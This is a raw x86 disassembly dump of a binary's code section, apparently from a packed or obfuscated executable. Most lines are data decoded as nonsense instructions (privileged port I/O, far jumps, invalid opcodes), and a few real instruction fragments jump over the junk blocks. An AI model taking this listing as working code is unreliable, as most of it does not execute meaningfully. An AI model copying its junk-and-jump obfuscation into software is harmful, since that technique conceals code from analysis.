  406b7d:	mov    cl,0xc9
  406b7f:	mov    DWORD PTR [ecx],0x28bdb75f
  406b85:	inc    eax
  406b86:	add    bh,BYTE PTR [ebx]
  406b88:	jle    0x406c08
  406b8a:	mov    esp,0x1e7e7e7f
  406b8f:	stos   DWORD PTR es:[edi],eax
  406b90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b91:	dec    eax
  406b92:	nop
  406b93:	dec    esp
  406b94:	xor    al,0xdd
  406b96:	sbb    bl,dl
  406b98:	mov    esp,0x169b621
  406b9d:	mov    ebx,0x5c4173f9
  406ba2:	js     0x406bdd
  406ba4:	mov    ebx,0xd39930c
  406ba9:	dec    edi
  406baa:	cmp    ah,BYTE PTR [esi]
  406bac:	sar    DWORD PTR [ecx+0x542133bf],1
  406bb2:	aas    
  406bb3:	in     eax,0x3a
  406bb5:	xor    eax,DWORD PTR [edx+edi*1]
  406bb8:	iret   
  406bb9:	cdq    
  406bba:	int    0x63
  406bbc:	and    al,0x72
  406bbe:	push   cs
  406bbf:	in     eax,0xd2
  406bc1:	popf   
  406bc2:	popf   
  406bc3:	loope  0x406bdc
  406bc5:	adc    edx,DWORD PTR [esi+ebx*4]
  406bc8:	retf   
  406bc9:	adc    BYTE PTR [esi],dl
  406bcb:	gs int3 
  406bcd:	sbb    BYTE PTR [ecx+0x127972f8],0x6b
  406bd4:	icebp  
  406bd5:	sbb    DWORD PTR [esi],eax
  406bd7:	and    bh,BYTE PTR [eax+0x77]
  406bda:	xor    eax,0xfa23899a
  406bdf:	push   0xffffffc5
  406be1:	adc    bl,BYTE PTR [edi]
  406be3:	daa    
  406be4:	loop   0x406bcd
  406be6:	test   eax,0x4ebfe04b
  406beb:	push   ebp
  406bec:	inc    eax
  406bed:	repz ret 
  406bef:	out    dx,al
  406bf0:	pop    esi
  406bf1:	ficom  DWORD PTR ds:0x6238e583
  406bf7:	mov    bh,0xd1
  406bf9:	dec    esi
  406bfa:	stos   DWORD PTR es:[edi],eax
  406bfb:	jmp    0x406bfe
  406bfd:	xlat   BYTE PTR ds:[ebx]
  406bfe:	add    al,BYTE PTR [ecx-0x7b]
  406c01:	add    BYTE PTR [edi+0x36],ah
  406c04:	inc    ebp
  406c05:	sub    DWORD PTR [esi+0x7244825f],ebp
  406c0b:	mov    DWORD PTR [ecx],eax
  406c0d:	pop    esp
  406c0e:	adc    eax,0x92679828
  406c13:	cmp    al,0x92
  406c15:	and    eax,0xd09f45ff
  406c1a:	mov    al,ds:0xdd3d3d8b
  406c1f:	sub    al,0x2c
  406c21:	into   
  406c22:	(bad)  
  406c23:	sub    cl,bh
  406c25:	(bad)  
  406c26:	sbb    al,0xa0
  406c28:	xor    BYTE PTR [edx-0x2d],ah
  406c2b:	mov    ebx,0x6b9d302d
  406c30:	lds    esi,FWORD PTR [esi+0x2534fbb1]
  406c36:	add    ebp,DWORD PTR [esi]
  406c38:	push   edx
  406c39:	push   0xf7dd8de2
  406c3e:	jmp    0x406c0c
  406c40:	push   ds
  406c41:	and    dl,dl
  406c43:	dec    edx
  406c44:	xchg   ebx,eax
  406c45:	xor    DWORD PTR [ebp+0x760c7891],0xffffff87
  406c4c:	cli    
  406c4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c4e:	xor    BYTE PTR [eax-0x47],cl
  406c51:	cwde   
  406c52:	out    dx,al
  406c53:	out    0x40,eax
  406c55:	scas   eax,DWORD PTR es:[edi]
  406c56:	jae    0x406c66
  406c58:	xor    al,dh
  406c5a:	(bad)  
  406c5b:	sti    
  406c5c:	test   DWORD PTR [esi+0x1ecd9db],ebp
  406c62:	cmp    eax,0x95ccb8e0
  406c67:	cs in  eax,0x4f
  406c6a:	(bad)  
  406c6b:	sbb    esp,DWORD PTR [edx+0x3eff5a2a]
  406c71:	bnd jge 0x406c48
  406c74:	loope  0x406cd5
  406c76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c77:	or     al,0xe5
  406c79:	test   BYTE PTR [edi-0x6f],ch
  406c7c:	(bad)  
  406c7d:	outs   dx,DWORD PTR ds:[esi]
  406c7e:	clc    
  406c7f:	xlat   BYTE PTR ds:[ebx]
  406c80:	pop    DWORD PTR [edi-0x69fea2d7]
  406c86:	in     al,0x74
  406c88:	test   BYTE PTR [edi+0x49],ch
  406c8b:	jmp    0x406cfd
  406c8d:	cmp    DWORD PTR [ecx+0x5b],eax
  406c90:	jg     0x406c99
  406c92:	repnz pushf 
  406c94:	jbe    0x406c95
  406c96:	or     cl,dl
  406c98:	xor    eax,0x11146f41
  406c9d:	dec    ebp
  406c9e:	fild   WORD PTR [edi-0x5eae204f]
  406ca4:	xor    DWORD PTR [esi+ebp*4-0x4cd87dd2],0x1c
  406cac:	xchg   esp,eax
  406cad:	(bad)  [ebp+0x7c744d0]
  406cb3:	mov    esp,0x247e6cbd
  406cb8:	dec    esp
  406cb9:	inc    ebp
  406cba:	(bad)  
  406cbb:	mov    cl,0x58
  406cbd:	call   0xca8a:0x736cd5c
  406cc4:	repz jg 0x406c59
  406cc7:	push   eax
  406cc8:	frndint 
  406cca:	and    al,0xbe
  406ccc:	fmul   st(3),st
  406cce:	dec    ebp
  406ccf:	retf   0xb750
  406cd2:	repz fdivr QWORD PTR [ebx-0xea2583c]
  406cd9:	(bad)  
  406cda:	cmp    al,0x2f
  406cdc:	ret    0xad41
  406cdf:	arpl   WORD PTR [ebx-0x6ce07eb9],cx
  406ce5:	push   edx
  406ce6:	jle    0x406cf6
  406ce8:	push   0x6a
  406cea:	lock lods al,BYTE PTR ds:[esi]
  406cec:	and    ecx,DWORD PTR ds:0x14cf94a2
  406cf2:	mov    esi,0xb465cdb7
  406cf7:	adc    BYTE PTR [esi],ch
  406cf9:	outs   dx,DWORD PTR ds:[esi]
  406cfa:	sub    DWORD PTR [esi],ebx
  406cfc:	adc    BYTE PTR [ebp-0x6a8d15d8],bh
  406d02:	push   edx
  406d03:	push   ebp
  406d04:	push   esi
  406d05:	sti    
  406d06:	jge    0x406cf5
  406d08:	push   esp
  406d09:	or     cl,BYTE PTR [edi]
  406d0b:	cwde   
  406d0c:	test   eax,0x145a1c84
  406d11:	fwait
  406d12:	jl     0x406cbb
  406d14:	xor    al,0xd6
  406d16:	dec    esp
  406d17:	test   al,0x2b
  406d19:	mov    ebx,0x4b186c5f
  406d1e:	cwde   
  406d1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d20:	pop    edx
  406d21:	repz inc ecx
  406d23:	mov    bl,0x5e
  406d25:	in     al,0x80
  406d27:	sbb    DWORD PTR [esi+0x47],0xfe9d328a
  406d2e:	add    BYTE PTR [ebx],0x83
  406d31:	mov    eax,ds:0xbc4333ee
  406d36:	repz out 0x1b,eax
  406d39:	iret   
  406d3a:	div    DWORD PTR [edx+0x71a00455]
  406d40:	mov    ebx,DWORD PTR [eax]
  406d42:	cs test eax,0x3f3b6c7c
  406d48:	repz push ecx
  406d4a:	cmc    
  406d4b:	mov    ds:0x63d18c3a,eax
  406d50:	xor    ax,cx
  406d53:	mov    ecx,0x3b02
  406d58:	sbb    DWORD PTR ds:0x43372f,0x433613
  406d62:	add    ax,cx
  406d65:	add    DWORD PTR ds:0x433723,0x7d57
  406d6f:	mov    ecx,DWORD PTR [ebp+0x8]
  406d72:	movzx  eax,ax
  406d75:	sbb    DWORD PTR ds:0x433663,0x43360f
  406d7f:	jmp    0x406f5e
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0x29
  406d91:	fstp   TBYTE PTR [edx+0x7e38403f]
  406d97:	jle    0x406d55
  406d99:	jg     0x406e19
  406d9b:	jle    0x406d5e
  406d9d:	xchg   ebp,eax
  406d9e:	xchg   ebx,eax
  406d9f:	mov    eax,DWORD PTR [esi]
  406da1:	jle    0x406d54
  406da3:	in     eax,dx
  406da4:	add    bh,ch
  406da6:	sub    dl,ah
  406da8:	xchg   BYTE PTR [eax],al
  406daa:	mov    dh,0x17
  406dac:	mov    al,0x73
  406dae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406daf:	mov    esp,DWORD PTR [edi+0x1c3b9b37]
  406db5:	mov    esp,0xe45e7120
  406dba:	(bad)  [ebx-0x4e]
  406dbd:	inc    eax
  406dbe:	arpl   WORD PTR [ebx],bp
  406dc0:	xor    eax,0x8c87376e
  406dc5:	mov    ecx,edx
  406dc7:	fiadd  WORD PTR [ebp+0x7d385f36]
  406dcd:	out    0xd,al
  406dcf:	lock jp 0x406deb
  406dd2:	aaa    
  406dd3:	addr16 jmp 0x546c7324
  406dd9:	cmp    esp,DWORD PTR [ebp-0x7b87170]
  406ddf:	jns    0x406d65
  406de1:	arpl   WORD PTR [ebp+0x7bb0fe12],cx
  406de7:	adc    ecx,ebp
  406de9:	(bad)  
  406deb:	mov    eax,ds:0x15c97d6f
  406df0:	pop    edx
  406df1:	rol    DWORD PTR [esi],cl
  406df3:	fild   QWORD PTR [esi]
  406df5:	lock and BYTE PTR [edx+ebp*1],ah
  406df9:	xor    BYTE PTR [ebx*4+0x6c7b27e5],bh
  406e00:	cdq    
  406e01:	push   0x13
  406e03:	or     al,0xd0
  406e05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e06:	inc    ecx
  406e07:	xchg   edi,eax
  406e08:	pushf  
  406e09:	add    al,0x5a
  406e0b:	dec    ebx
  406e0c:	leave  
  406e0d:	cdq    
  406e0e:	(bad)  
  406e0f:	push   ebx
  406e10:	sub    DWORD PTR [ebx-0x34dc0128],0xa199477c
  406e1a:	test   DWORD PTR [ecx-0x63],esi
  406e1d:	push   eax
  406e1e:	call   0xa668:0x7049665b
  406e25:	retf   0x9558
  406e28:	test   al,0x28
  406e2a:	ins    DWORD PTR es:[edi],dx
  406e2b:	adc    ax,0xae3f
  406e2f:	mov    WORD PTR [esi],gs
  406e31:	xchg   DWORD PTR [edx-0x5b],esi
  406e34:	outs   dx,BYTE PTR ds:[esi]
  406e35:	adc    ebp,eax
  406e37:	in     eax,dx
  406e38:	inc    ebp
  406e39:	mov    dh,0xe9
  406e3b:	jmp    0xc1c10dbc
  406e40:	repnz test al,0x5b
  406e43:	lds    eax,FWORD PTR [ecx]
  406e45:	ins    BYTE PTR es:[edi],dx
  406e46:	inc    ebx
  406e47:	cwde   
  406e48:	sbb    BYTE PTR [ecx-0x79],ch
  406e4b:	mov    ch,0x13
  406e4d:	cmp    cl,BYTE PTR [edx]
  406e4f:	jge    0x406dea
  406e51:	or     al,0x4a
  406e53:	dec    esp
  406e54:	and    eax,0xb078a4c2
  406e59:	jle    0x406e7c
  406e5b:	enter  0x98d,0x2d
  406e5f:	retf   
  406e60:	mov    WORD PTR [ebx+eiz*1-0x32],ss
  406e64:	jecxz  0x406ea6
  406e66:	xor    DWORD PTR [ebp-0x20],edi
  406e69:	ins    BYTE PTR es:[edi],dx
  406e6a:	add    eax,0x3fb758cf
  406e6f:	nop
  406e70:	mov    edx,0x44760781
  406e75:	popa   
  406e76:	clc    
  406e77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e78:	cmp    al,0x18
  406e7a:	in     eax,0x4e
  406e7c:	push   ebx
  406e7d:	pushf  
  406e7e:	push   esi
  406e7f:	cmp    esp,DWORD PTR [edi+0x7eaae2c]
  406e85:	xchg   edi,eax
  406e86:	mov    edx,0x5b1026f
  406e8b:	jle    0x406e92
  406e8d:	cmp    DWORD PTR [eax+eiz*1-0x36620cc0],edx
  406e94:	out    0x77,eax
  406e96:	rol    DWORD PTR [eax+0x1ec30b40],cl
  406e9c:	fadd   DWORD PTR [ecx-0x9]
  406e9f:	mov    DWORD PTR [ebx+edi*2+0x1182bbdf],edi
  406ea6:	shr    DWORD PTR [esi],1
  406ea8:	test   ebp,0x765413c1
  406eae:	stos   DWORD PTR es:[edi],eax
  406eaf:	loope  0x406f30
  406eb1:	mov    ebp,0xbbb03c2b
  406eb6:	in     al,0x3a
  406eb8:	inc    esi
  406eb9:	adc    cl,ch
  406ebb:	test   eax,0x93ccdeef
  406ec0:	bnd jnp 0x406ef7
  406ec3:	rcl    BYTE PTR [ecx],1
  406ec5:	outs   dx,DWORD PTR ds:[esi]
  406ec6:	dec    ecx
  406ec7:	xchg   ebp,eax
  406ec8:	or     bl,bh
  406eca:	mov    WORD PTR [edx+edi*1-0x6],ss
  406ece:	std    
  406ecf:	mov    esi,0x6cf87f3d
  406ed4:	and    BYTE PTR [esi+0x7b],bh
  406ed7:	mov    ds:0x2d526cf4,eax
  406edc:	shl    BYTE PTR [ebp+0x1f276d50],cl
  406ee2:	push   0xffffff91
  406ee4:	jb     0x406f2a
  406ee6:	mov    bl,BYTE PTR [ebp+0x5b]
  406ee9:	scas   al,BYTE PTR es:[edi]
  406eea:	loop   0x406ebd
  406eec:	stos   BYTE PTR es:[edi],al
  406eed:	pop    ebx
  406eee:	push   eax
  406eef:	jmp    0x406ed9
  406ef1:	pop    ebp
  406ef2:	test   DWORD PTR [ebx-0x3c],ebx
  406ef5:	test   BYTE PTR [esi+0x7a],dl
  406ef8:	mov    edi,edi
  406efa:	leave  
  406efb:	arpl   WORD PTR [ebp+0x4e544571],bx
  406f01:	loope  0x406ee5
  406f03:	sbb    BYTE PTR [esi+0x2ba98215],0xaf
  406f0a:	cli    
  406f0b:	xchg   edi,eax
  406f0c:	les    edx,FWORD PTR [ecx]
  406f0e:	daa    
  406f0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f10:	or     ecx,0xffffffaf
  406f13:	aad    0x5a
  406f15:	ja     0x406ed7
  406f17:	dec    ebx
  406f18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f19:	mov    al,ds:0x816d80da
  406f1e:	mov    edx,0x2bec5eb
  406f23:	or     ebp,edi
  406f25:	out    dx,al
  406f26:	jb     0x406f18
  406f28:	mov    eax,0xe79a9a1a
  406f2d:	std    
  406f2e:	push   ds
  406f2f:	sar    BYTE PTR [edx],0x91
  406f32:	inc    edx
  406f33:	ret    
  406f34:	nop
  406f35:	jmp    0x34df:0x20a48881
  406f3c:	(bad)  
  406f3d:	pop    eax
  406f3e:	adc    al,0x8f
  406f40:	xchg   esi,eax
  406f41:	cmp    ebp,DWORD PTR ss:0xa12664d3
  406f48:	pop    edi
  406f49:	xchg   esi,eax
  406f4a:	mov    al,ds:0xcba1fe38
  406f4f:	xchg   ebx,eax
  406f50:	nop
  406f51:	nop
  406f52:	cmp    DWORD PTR [edi+0x8],ebx
  406f55:	pop    edx
  406f56:	xchg   BYTE PTR [esi+0x471cae02],ch
  406f5c:	jnp    0x406ee4
  406f5e:	not    eax
  406f60:	and    DWORD PTR ds:0x43360f,0x433653
  406f6a:	and    eax,DWORD PTR [ecx]
  406f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  406f6f:	mov    DWORD PTR [ecx],eax
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0x4088d260
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0xc27e7e7f
  406f9f:	ins    BYTE PTR es:[edi],dx
  406fa0:	jae    0x407012
  406fa2:	cmp    ch,BYTE PTR [ecx-0x4ec090fc]
  406fa8:	push   ss
  406fa9:	int    0x8c
  406fab:	std    
  406fac:	bsr    ecx,DWORD PTR [edi]
  406faf:	jmp    0x277a01a1
  406fb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fb5:	bound  esi,QWORD PTR [ebp+0x2c]
  406fb8:	call   0xe812158c
  406fbd:	push   es
  406fbe:	sub    BYTE PTR fs:[edx+0x13ced746],al
  406fc5:	sti    
  406fc6:	jne    0x407030
  406fc8:	xor    ecx,DWORD PTR [eax]
  406fca:	std    
  406fcb:	es mov dh,0x9c
  406fce:	or     DWORD PTR [esp+edi*2+0x58013cfd],0x4f
  406fd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fd7:	adc    al,0x88
  406fd9:	fwait
  406fda:	push   0x1906dc10
  406fdf:	hlt    
  406fe0:	scas   eax,DWORD PTR es:[edi]
  406fe1:	and    eax,0x248d2a74
  406fe6:	cs enter 0xacef,0x63
  406feb:	shl    DWORD PTR [esi+esi*2-0x1711f2f8],cl
  406ff2:	fld    QWORD PTR ds:[ebx+0x7f3f1df6]
  406ff9:	je     0x406fad
  406ffb:	lods   eax,DWORD PTR ds:[esi]
  406ffc:	push   esi
  406ffd:	mov    esp,0x2d57cb7d
  407002:	sub    esi,DWORD PTR [edx]
  407004:	popa   
  407005:	das    
  407006:	adc    eax,0x627784c3
  40700b:	dec    esi
  40700c:	fs xchg esi,eax
  40700e:	sub    al,0x7a
  407010:	ss mov dh,0x70
  407013:	jecxz  0x406fe0
  407015:	sub    DWORD PTR [ecx+0xa],edx
  407018:	adc    al,0x50
  40701a:	ins    DWORD PTR es:[edi],dx
  40701b:	jo     0x406f9f
  40701d:	lds    ecx,FWORD PTR [esi+0xd0eaaa0]
  407023:	pop    ebp
  407024:	jo     0x407031
  407026:	sub    ebp,DWORD PTR [ebp+0x2c]
  407029:	icebp  
  40702a:	repz add eax,0xf5626752
  407030:	enter  0xa095,0x86
  407034:	retf   
  407035:	in     eax,0xa6
  407037:	sub    bh,al
  407039:	jl     0x406fe0
  40703b:	xchg   ecx,eax
  40703c:	adc    al,0xed
  40703e:	clc    
  40703f:	js     0x40700b
  407041:	test   eax,0xa29e0968
  407046:	mov    ah,BYTE PTR [esi-0x1b]
  407049:	test   DWORD PTR [ebp+0x63ed29fc],esi
  40704f:	cmc    
  407050:	and    al,0xd6
  407052:	xchg   DWORD PTR ds:0x3da72ed5,edi
  407058:	rcl    DWORD PTR [ebx-0x7f],1
  40705b:	dec    edx
  40705c:	iret   
  40705d:	cwde   
  40705e:	jo     0x4070d5
  407060:	inc    esp
  407061:	(bad)  
  407062:	mov    esi,0xbe2b7bc1
  407067:	scas   al,BYTE PTR es:[edi]
  407068:	xchg   esi,eax
  407069:	push   cs
  40706a:	sub    dl,BYTE PTR [eax]
  40706c:	xor    eax,0x2cc692a3
  407071:	push   ecx
  407072:	mov    ecx,0x65e04fc7
  407077:	jecxz  0x4070cd
  407079:	mov    dl,0x9c
  40707b:	add    BYTE PTR [esi],bh
  40707d:	xchg   ecx,eax
  40707e:	cmc    
  40707f:	icebp  
  407080:	jno    0x407005
  407082:	jl     0x407016
  407084:	mov    ah,0x16
  407086:	sti    
  407087:	ret    
  407088:	imul   edi,DWORD PTR [edx-0x417d337b],0x11
  40708f:	mov    ah,0xb
  407091:	je     0x4070d7
  407093:	nop
  407094:	mov    WORD PTR [eax-0x61],es
  407097:	(bad)  
  407098:	fcomp  DWORD PTR [ebp+edi*1-0x36baafc4]
  40709f:	pop    ss
  4070a0:	add    al,0xab
  4070a2:	call   0xef5b6a77
  4070a7:	mov    dh,0xc0
  4070a9:	sbb    BYTE PTR [eax],0xbe
  4070ac:	out    dx,al
  4070ad:	in     eax,0x4c
  4070af:	sahf   
  4070b0:	or     DWORD PTR [edx-0x2c],ebp
  4070b3:	push   ebx
  4070b4:	les    ebx,FWORD PTR [ecx]
  4070b6:	mov    WORD PTR [esi+0x3479bfb0],ds
  4070bc:	inc    esp
  4070bd:	call   0xe4a5:0x4b03a29c
  4070c4:	xlat   BYTE PTR ds:[ebx]
  4070c5:	sbb    esi,esp
  4070c7:	inc    ebx
  4070c8:	fimul  DWORD PTR [edx-0x5c]
  4070cb:	mov    edi,0x3f267c8f
  4070d0:	ins    DWORD PTR es:[edi],dx
  4070d1:	add    al,0xca
  4070d3:	jle    0x40711f
  4070d5:	loopne 0x407085
  4070d7:	jmp    0x1745:0x9eb580bf
  4070de:	les    edx,FWORD PTR [ecx+0x64]
  4070e1:	and    edx,DWORD PTR [edx-0x22]
  4070e4:	push   ebx
  4070e5:	or     BYTE PTR [ebx],dl
  4070e7:	xor    ebx,DWORD PTR [ecx-0x22040edd]
  4070ed:	jl     0x4070cf
  4070ef:	jge    0x407156
  4070f1:	clc    
  4070f2:	rcr    esi,0xad
  4070f5:	ins    BYTE PTR es:[edi],dx
  4070f6:	std    
  4070f7:	mov    bl,0x72
  4070f9:	fstp   TBYTE PTR [ebx+esi*4+0x2d]
  4070fd:	push   eax
  4070fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070ff:	lock adc al,0xc2
  407102:	dec    ebp
  407103:	and    dh,BYTE PTR [edx+ebp*8]
  407106:	test   DWORD PTR [esi],ebx
  407108:	stc    
  407109:	mov    ds:0x2edb53fe,eax
  40710e:	test   eax,0x25232cba
  407113:	push   0xbc90300c
  407118:	arpl   WORD PTR [edi-0x1b],sp
  40711b:	jnp    0x4070a3
  40711d:	jp     0x4070ff
  40711f:	and    DWORD PTR [ebx+0x680196c9],0xe20912dc
  407129:	test   BYTE PTR [edi+0x73b55ca9],al
  40712f:	inc    ebp
  407130:	sub    ebx,ecx
  407132:	mov    ds:0xe80ab564,al
  407137:	jge    0x40713b
  407139:	and    DWORD PTR [esi],ebp
  40713b:	mov    ds,WORD PTR [ecx]
  40713d:	mov    ds:0xd0bbcb3,al
  407142:	mov    ecx,0x333345bf
  407147:	push   0x8949ee2b
  40714c:	fild   DWORD PTR [eax+0x2a]
  40714f:	sbb    al,0x79
  407151:	jae    0x407194
  407153:	add    dl,BYTE PTR [ecx]
  407155:	sti    
  407156:	fwait
  407157:	push   edi
  407158:	rol    BYTE PTR [ebx+0x1],1
  40715b:	pop    eax
  40715c:	jl     0x4070df
  40715e:	cs xchg esi,eax
  407160:	push   DWORD PTR [ebp+0x8]
  407163:	call   0x407353
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	xor    esi,DWORD PTR [edi+eax*1]
  40717e:	or     eax,0x7e7ec4cc
  407183:	mov    esp,0x4d7e7e7f
  407188:	popf   
  407189:	pop    es
  40718a:	mov    eax,ds:0x3e7783b2
  40718f:	push   ebx
  407190:	inc    eax
  407191:	dec    ebx
  407192:	mov    dh,0x18
  407194:	and    edi,esi
  407196:	pop    esp
  407197:	repz pop edi
  407199:	cld    
  40719a:	pushf  
  40719b:	pop    ecx
  40719c:	ds bswap ecx
  40719f:	hlt    
  4071a0:	(bad)  
  4071a1:	out    dx,eax
  4071a2:	inc    esi
  4071a3:	sbb    BYTE PTR [eax+0x4c46bb57],dl
  4071a9:	add    DWORD PTR [edx],ebp
  4071ab:	out    dx,al
  4071ac:	popa   
  4071ad:	or     bl,BYTE PTR [ebx+0x4a1faeb5]
  4071b3:	les    ebp,FWORD PTR es:[ecx+0x104783e8]
  4071ba:	fs sbb ebp,edx
  4071bd:	mov    dl,BYTE PTR [esp+edi*4-0x1e]
  4071c1:	clc    
  4071c2:	jmp    0x4071a5
  4071c4:	pop    ecx
  4071c5:	outs   dx,DWORD PTR ds:[esi]
  4071c6:	push   edi
  4071c7:	fld    DWORD PTR [ebp+0x7d89a3b8]
  4071cd:	scas   eax,DWORD PTR es:[edi]
  4071ce:	pop    ebp
  4071cf:	mov    WORD PTR [ebx],ds
  4071d1:	pop    esi
  4071d2:	imul   esi,DWORD PTR [ebx-0x7d187e40],0x914f66f
  4071dc:	mov    eax,edx
  4071de:	mov    BYTE PTR [edx],0x3d
  4071e1:	fs xor eax,0x9ac0b064
  4071e7:	cmp    ecx,ecx
  4071e9:	inc    ebx
  4071ea:	jmp    0x62ba78d4
  4071ef:	mov    edi,0x78b6d531
  4071f4:	adc    ecx,ebx
  4071f6:	mov    bl,0x10
  4071f8:	xchg   esp,eax
  4071f9:	xor    al,0xbc
  4071fb:	pop    eax
  4071fc:	jo     0x407249
  4071fe:	xor    DWORD PTR [ebx-0x7e],0x5d14dcfc
  407205:	enter  0x2a0,0xf1
  407209:	retf   
  40720a:	inc    edx
  40720b:	xchg   edx,eax
  40720c:	cmp    ecx,edx
  40720e:	mov    bh,0xf7
  407210:	dec    edx
  407211:	push   ds
  407212:	push   edi
  407213:	mov    dl,BYTE PTR [ebx]
  407215:	data16 fsubr DWORD PTR [edi]
  407218:	inc    eax
  407219:	inc    ebp
  40721a:	push   esi
  40721b:	xor    ebp,DWORD PTR [edi-0x4d0bbd19]
  407221:	shr    DWORD PTR [eax-0x71],0xb2
  407225:	and    edx,DWORD PTR [ecx]
  407227:	or     esi,ebp
  407229:	ret    
  40722a:	mov    cl,dh
  40722c:	push   ecx
  40722d:	ss popa 
  40722f:	adc    ah,bh
  407231:	add    BYTE PTR [esi+eiz*4],ch
  407234:	imul   ecx,DWORD PTR [ecx+0x57],0x7e814ffd
  40723b:	mov    edi,0x2c060fd6
  407240:	(bad)  
  407242:	xor    BYTE PTR [ecx+ebx*4],0x87
  407246:	int    0xb9
  407248:	dec    esi
  407249:	repnz dec eax
  40724b:	clc    
  40724c:	stos   DWORD PTR es:[edi],eax
  40724d:	xor    eax,0x4b68ef4b
  407252:	mov    ah,0xf2
  407254:	adc    BYTE PTR [ebx-0x1530d20b],ah
  40725a:	jge    0x40729c
  40725c:	pop    esp
  40725d:	mov    ds:0x498a8cdb,eax
  407262:	stos   BYTE PTR es:[edi],al
  407263:	or     DWORD PTR [edx+0x30],edi
  407266:	(bad)  
  407267:	xchg   ebp,eax
  407268:	mov    al,0xb0
  40726a:	dec    ebp
  40726b:	and    ebx,DWORD PTR [eax]
  40726d:	pop    ecx
  40726e:	sub    DWORD PTR [ebp-0x589b22e7],esp
  407274:	xor    ch,BYTE PTR [ebx-0x3c96b67a]
  40727a:	out    dx,eax
  40727b:	add    dh,al
  40727d:	in     al,0xfb
  40727f:	ins    BYTE PTR es:[edi],dx
  407280:	adc    bl,BYTE PTR [esi+0x3b]
  407283:	add    dl,cl
  407285:	sub    cl,dl
  407287:	std    
  407288:	jge    0x40728d
  40728a:	aas    
  40728b:	push   edx
  40728c:	sub    eax,0xa1ce6b85
  407291:	repnz scas eax,DWORD PTR es:[edi]
  407293:	and    BYTE PTR [ebx+ebp*8+0x78],bh
  407297:	fild   WORD PTR [eax-0x3b]
  40729a:	jmp    0x4072bf
  40729c:	loope  0x4072d2
  40729e:	xor    al,0x8f
  4072a0:	mov    al,0x45
  4072a2:	mov    edi,0x51419185
  4072a7:	jns    0x4072f1
  4072a9:	pushf  
  4072aa:	sbb    DWORD PTR [ebx-0x33],0xe
  4072ae:	ins    DWORD PTR es:[edi],dx
  4072af:	push   edi
  4072b0:	stos   DWORD PTR es:[edi],eax
  4072b1:	aad    0xa0
  4072b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072b4:	xchg   ebp,eax
  4072b5:	and    eax,DWORD PTR [edi]
  4072b7:	aam    0x75
  4072b9:	pop    eax
  4072ba:	jge    0x4072e8
  4072bc:	add    bh,al
  4072be:	jge    0x407269
  4072c0:	loope  0x40732a
  4072c2:	xchg   esi,eax
  4072c3:	outs   dx,DWORD PTR ds:[esi]
  4072c4:	sub    eax,0x74058564
  4072c9:	pushf  
  4072ca:	adc    DWORD PTR [edx+ecx*8+0x32],esi
  4072ce:	push   esi
  4072cf:	jb     0x4072e4
  4072d1:	pushf  
  4072d2:	sub    edi,DWORD PTR ds:0xf8d58130
  4072d8:	pop    ds
  4072d9:	mov    edx,ss
  4072db:	mov    eax,ds:0xfb5439c0
  4072e0:	in     al,dx
  4072e1:	rcr    DWORD PTR [edx+0x4a1a0e6b],1
  4072e7:	push   ebx
  4072e8:	(bad)  
  4072e9:	cmp    BYTE PTR [eax+0x57a863c3],al
  4072ef:	jae    0x4072f9
  4072f1:	repnz inc ecx
  4072f3:	add    esp,DWORD PTR [ecx+edx*4+0x7e057bea]
  4072fa:	inc    ecx
  4072fb:	jle    0x4072ab
  4072fd:	dec    esp
  4072fe:	loopne 0x4072b9
  407300:	adc    BYTE PTR [edi],0x84
  407303:	int    0x2
  407305:	jb     0x407313
  407307:	or     bl,BYTE PTR [ebp-0x3b]
  40730a:	xchg   ecx,eax
  40730b:	sub    BYTE PTR [edx-0xe],bh
  40730e:	scas   al,BYTE PTR es:[edi]
  40730f:	(bad)  
  407310:	push   ds
  407311:	pop    eax
  407312:	inc    eax
  407313:	sub    al,0x27
  407315:	mov    al,ds:0x6476d061
  40731a:	fdiv   st,st(6)
  40731c:	and    DWORD PTR [esi-0x491d7542],esp
  407322:	das    
  407323:	jge    0x4072be
  407325:	outs   dx,BYTE PTR ds:[esi]
  407326:	jmp    0x6197:0xd4579f1
  40732d:	je     0x4072c6
  40732f:	cdq    
  407330:	adc    BYTE PTR [edi],ch
  407332:	jae    0x40732a
  407334:	out    dx,al
  407335:	xor    dl,dh
  407337:	adc    BYTE PTR [ebx+0x27d4a1f7],ah
  40733d:	cli    
  40733e:	les    esi,FWORD PTR [edx]
  407340:	hlt    
  407341:	xor    edi,eax
  407343:	mov    DWORD PTR [eax+0x483ed117],ebx
  407349:	je     0x406f76
  40734f:	leave  
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x433657,0x5787
